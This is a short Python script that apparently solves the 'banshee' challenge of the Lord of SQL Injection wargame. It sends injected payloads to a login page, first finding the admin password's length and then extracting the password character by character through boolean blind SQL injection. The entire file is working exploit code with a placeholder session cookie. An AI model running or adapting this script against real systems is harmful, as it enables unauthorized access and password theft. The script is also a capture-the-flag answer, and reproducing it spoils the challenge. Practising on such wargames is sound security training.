import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?\
            pw=' or id='admin' and length(pw)=%d-- " % i
    res = requests.get(url, cookies=cookie)
    
    if "login success!" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?\
            pw=' or id='admin' and unicode(substr(pw,%d,1))=%d-- " % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "login success!" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break